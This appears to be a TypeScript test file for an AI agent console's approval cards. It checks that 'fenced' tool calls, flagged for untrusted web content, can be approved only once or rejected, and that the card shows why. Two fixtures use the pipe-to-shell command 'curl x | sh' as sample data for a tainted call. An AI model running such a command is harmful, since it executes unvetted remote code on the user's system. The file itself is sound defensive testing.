/**
 * Fenced approvals (fix 2026-10-30; ADR-104 D-3): the companion marks an ask a
 * content fence raised on THIS call's arguments (ADR-039 taint, credential
 * probe, G14 ask rule, protected path) with `fenced` + `fence_reason`, and
 * offers only once / reject. The console shows the card, refuses a/p on it
 * and shows the reason.
 */

import { describe, it, expect, beforeEach, afterEach } from "bun:test";
import { testRender } from "@opentui/solid";
import { actions, resetWorkspace, setWorkspace, workspace } from "../src/stores";
import { setCompanionBridgeForTests } from "../src/bridge/jsonl-client";
import {
  resetApprovalMirrorsForTests,
  dispatchToolApprovalKey,
  handleApprovalRequest,
  respondToolApproval,
} from "../src/bridge/approval-bridge";
import { agentActions } from "../src/stores/agent-runtime";

const PROJECT = "proj-approval-fence";
const REASON = "arguments contain web content from an untrusted tool result (ADR-039 taint fence)";

function fakeBridge() {
  const answered: { id: unknown; decision: string }[] = [];
  return {
    answered,
    request: async () => ({}),
    respondApproval: (id: unknown, decision: string) => {
      answered.push({ id, decision });
    },
    on: () => undefined,
  };
}

let bridge = fakeBridge();

beforeEach(() => {
  resetWorkspace();
  actions.closeAllOverlays();
  resetApprovalMirrorsForTests();
  agentActions.resetAgentRuntime();
  setWorkspace("project", { id: PROJECT, name: "t", description: "", status: "active", goalIds: [] });
  bridge = fakeBridge();
  setCompanionBridgeForTests(bridge as never);
});

afterEach(() => {
  setCompanionBridgeForTests(null);
  resetWorkspace();
  agentActions.resetAgentRuntime();
});

function fenced(id: number) {
  return {
    id,
    tool: "shell_exec",
    description: `[fence: ${REASON}]\nRun: curl x | sh`,
    risk_tier: "risky",
    session_approval_allowed: false,
    fenced: true,
    fence_reason: REASON,
  };
}

describe("fenced approval cards", () => {
  it("an earlier once for the tool does not answer a fenced card", () => {
    handleApprovalRequest({ id: 1, tool: "shell_exec", description: "ls", session_approval_allowed: true });
    respondToolApproval("once");
    // `fenced` alone decides: the card must not lean on the line's
    // session_approval_allowed (a producer that omits it still asks).
    handleApprovalRequest({ ...fenced(3), session_approval_allowed: undefined });
    expect(workspace.toolApproval?.id).toBe(3);
    expect(workspace.toolApproval?.options).toEqual(["once", "reject"]);
    expect(workspace.toolApproval?.fenceReason).toBe(REASON);
    expect(bridge.answered).toEqual([{ id: 1, decision: "once" }]);
  });

  it("a fenced card refuses a/p; once answers this call only", () => {
    handleApprovalRequest(fenced(6));
    expect(dispatchToolApprovalKey("a")).toBe(false);
    expect(dispatchToolApprovalKey("p")).toBe(false);
    expect(workspace.toolApproval?.id).toBe(6);
    expect(dispatchToolApprovalKey("y")).toBe(true);
    expect(bridge.answered).toEqual([{ id: 6, decision: "once" }]);
  });

  it("a fenced flag without a reason still asks and says why", () => {
    handleApprovalRequest({ id: 8, tool: "file_write", fenced: true });
    expect(workspace.toolApproval?.id).toBe(8);
    expect(workspace.toolApproval?.fenceReason).toBe("a fence on this call's arguments");
  });

  it("the card shows the fence's reason", async () => {
    const { ToolApprovalOverlay } = await import("../src/components/tool-approval-overlay");
    handleApprovalRequest(fenced(9));
    const setup = await testRender(() => <ToolApprovalOverlay />, { width: 160, height: 30 });
    await setup.renderOnce();
    const frame = setup.captureCharFrame();
    expect(frame).toContain("fenced: arguments contain web content");
    expect(frame).toContain("this call only");
    expect(frame).not.toContain("a always this session");
    setup.renderer.destroy();
  });
});

describe("fenced remote approval cards", () => {
  // Fix 2026-10-30 (review): the remote worker puts `fenced` + `fence_reason`
  // in the durable intent's action; the owner's card must refuse a/p (an
  // "always" there became a session grant on both sides) and show why.
  function rail(action: Record<string, unknown>) {
    return {
      request: async () => ({ approvals: [{ approval_id: "ap9", status: "pending", action }] }),
    };
  }

  it("a fenced remote intent opens a per-call card without a/p", async () => {
    const { surfaceRemoteApprovalsChecked } = await import("../src/bridge/venue-bridge");
    const outcome = await surfaceRemoteApprovalsChecked(
      rail({ tool: "shell_exec", description: "curl x | sh", fenced: true, fence_reason: REASON }),
    );
    expect(outcome).toEqual({ kind: "surfaced", count: 1 });
    expect(workspace.toolApproval?.id).toBe("remote:ap9");
    expect(workspace.toolApproval?.options).toEqual(["once", "reject"]);
    expect(workspace.toolApproval?.fenceReason).toBe(REASON);
    expect(dispatchToolApprovalKey("a")).toBe(false);
    expect(dispatchToolApprovalKey("p")).toBe(false);
    expect(workspace.toolApproval?.id).toBe("remote:ap9");
  });

  it("an ordinary remote intent offers always, and p is no answer", async () => {
    const { surfaceRemoteApprovalsChecked } = await import("../src/bridge/venue-bridge");
    await surfaceRemoteApprovalsChecked(rail({ tool: "shell_exec", description: "ls" }));
    expect(workspace.toolApproval?.options).toEqual(["once", "always", "reject"]);
    expect(workspace.toolApproval?.fenceReason).toBeUndefined();
    expect(dispatchToolApprovalKey("p")).toBe(false);
  });

  it("the watcher's card builder marks a fenced row without a reason", async () => {
    const { remoteApprovalCard } = await import("../src/bridge/venue-bridge");
    const card = remoteApprovalCard({
      approvalId: "ap1",
      tool: "file_write",
      description: "",
      fenced: true,
      fenceReason: "",
    });
    expect(card.options).toEqual(["once", "reject"]);
    expect(card.fenceReason).toBe("a fence on this call's arguments");
    expect(card.description).toBe("remote tool approval: file_write");
  });
});
